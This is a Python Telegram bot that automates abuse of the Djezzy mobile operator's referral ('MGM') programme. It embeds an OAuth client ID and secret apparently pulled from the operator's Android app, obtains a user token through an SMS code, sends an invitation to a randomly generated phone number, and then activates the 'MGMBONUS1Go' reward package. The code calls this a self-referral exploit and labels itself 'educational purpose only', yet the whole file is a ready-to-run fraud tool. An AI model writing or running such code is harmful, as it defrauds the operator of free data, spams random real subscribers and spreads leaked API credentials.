# Telegram bot — Djezzy MGM invitation / reward attempt (most likely DOES NOT WORK anymore)
# Converted from Android app logic — educational purpose only
# Requires: pip install python-telegram-bot==20.7 httpx

import asyncio
import logging
import random
import re
from typing import Optional

import httpx
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ────────────────────────────────────────────────
#   Configuration — taken from original code
# ────────────────────────────────────────────────

CLIENT_ID = "87pIExRhxBb3_wGsA5eSEfyATloa"
CLIENT_SECRET = "uf82p68Bgisp8Yg1Uz8Pf6_v1XYa"
BASE_URL = "https://apim.djezzy.dz"

HEADERS_BASE = {
    "User-Agent": "MobileApp/3.0.0",
    "Accept": "application/json",
    "Connection": "keep-alive",
}

REFERRAL_PACKAGE_CODE = "MGMBONUS1Go"

# States for ConversationHandler
PHONE, OTP = range(2)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)


def normalize_phone(phone: str) -> str:
    """Convert 07xxxxxxxx → 2137xxxxxxxx"""
    phone = re.sub(r"[^0-9]", "", phone.strip())
    if phone.startswith("0") and len(phone) == 10:
        return "213" + phone[1:]
    if phone.startswith("213") and len(phone) == 12:
        return phone
    return ""


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "📱 <b>Djezzy MGM Bonus Bot</b>\n\n"
        "Enter your phone number in format <code>07XXXXXXXX</code>",
        parse_mode=ParseMode.HTML,
    )
    return PHONE


async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw = update.message.text.strip()
    normalized = normalize_phone(raw)

    if not normalized:
        await update.message.reply_text(
            "❌ Invalid format. Please send number like <code>0770123456</code>",
            parse_mode=ParseMode.HTML,
        )
        return PHONE

    context.user_data["phone"] = normalized

    # Step 1 — Request OTP registration
    try:
        async with httpx.AsyncClient(timeout=20.0) as client:
            r = await client.post(
                f"{BASE_URL}/mobile-api/oauth2/registration",
                params={"msisdn": normalized, "client_id": CLIENT_ID, "scope": "smsotp"},
                json={
                    "consent-agreement": [{"marketing-notifications": False}],
                    "is-consent": True,
                },
                headers=HEADERS_BASE,
            )

            if r.status_code not in (200, 201, 202, 204):
                text = f"❌ OTP request failed\nHTTP {r.status_code}\n{r.text[:200]}"
                await update.message.reply_text(text)
                return ConversationHandler.END

    except Exception as e:
        await update.message.reply_text(f"⚠ Network error: {str(e)}")
        return ConversationHandler.END

    await update.message.reply_text(
        f"🔢 OTP was requested for <code>{normalized}</code>\n\n"
        "Please enter the 6-digit code you received via SMS:",
        parse_mode=ParseMode.HTML,
    )

    return OTP


async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    if not re.match(r"^\d{4,6}$", otp):
        await update.message.reply_text("❌ OTP should be 4–6 digits")
        return OTP

    phone = context.user_data.get("phone")
    if not phone:
        await update.message.reply_text("Session expired. Use /start again.")
        return ConversationHandler.END

    token: Optional[str] = None

    # Step 2 — Exchange OTP → Bearer token
    try:
        async with httpx.AsyncClient(timeout=20.0) as client:
            r = await client.post(
                f"{BASE_URL}/mobile-api/oauth2/token",
                data={
                    "otp": otp,
                    "mobileNumber": phone,
                    "scope": "djezzyAppV2",
                    "client_id": CLIENT_ID,
                    "client_secret": CLIENT_SECRET,
                    "grant_type": "mobile",
                },
                headers={**HEADERS_BASE, "Content-Type": "application/x-www-form-urlencoded"},
            )

            if r.status_code != 200:
                await update.message.reply_text(
                    f"❌ Token exchange failed\nHTTP {r.status_code}\n{r.text[:300]}"
                )
                return ConversationHandler.END

            data = r.json()
            token = data.get("access_token")
            if not token:
                await update.message.reply_text("❌ No access_token in response")
                return ConversationHandler.END

    except Exception as e:
        await update.message.reply_text(f"⚠ Error during token request: {str(e)}")
        return ConversationHandler.END

    bearer = f"Bearer {token}"

    # Step 3 — Try to send invitation to a random number (self-referral attempt)
    fake_target = f"2137{random.randint(1000000, 9999999)}"

    success = False
    message = ""

    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            # Send invitation
            r_invite = await client.post(
                f"{BASE_URL}/api/v1/services/mgm/send-invitation",
                json={"msisdnReciever": fake_target},
                headers={**HEADERS_BASE, "Authorization": bearer},
            )

            if r_invite.status_code == 200:
                await asyncio.sleep(2.8)  # imitate original delay

                # Activate reward
                r_activate = await client.post(
                    f"{BASE_URL}/api/v1/services/mgm/activate-reward",
                    json={"packageCode": REFERRAL_PACKAGE_CODE},
                    headers={**HEADERS_BASE, "Authorization": bearer},
                )

                if r_activate.status_code in (200, 201, 204):
                    success = True
                    data = r_activate.json()
                    msg_ar = (
                        data.get("message", {})
                        .get("ar", "تمت الإضافة بنجاح (hopefully)")
                    )
                    message = f"✅ <b>Success (maybe)</b>\n{msg_ar}"
                else:
                    message = f"⚠ Activation failed\nHTTP {r_activate.status_code}\n{r_activate.text[:200]}"
            else:
                message = f"⚠ Invitation failed\nHTTP {r_invite.status_code}\n{r_invite.text[:200]}"

    except Exception as e:
        message = f"Critical error: {str(e)}"

    if success:
        await update.message.reply_text(
            f"{message}\n\nTarget used: <code>{fake_target}</code>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            f"❌ Operation failed\n\n{message}\n\n"
            "<i>Most likely the exploit was patched.</i>",
            parse_mode=ParseMode.HTML,
        )

    # Clean up
    context.user_data.clear()
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Cancelled.")
    context.user_data.clear()
    return ConversationHandler.END


def main():
    # Replace with your real bot token
    TOKEN = "YOUR_BOT_TOKEN_HERE"

    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start", start))  # also allow /start anytime

    print("Bot is starting... (most likely won't give bonus anymore)")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
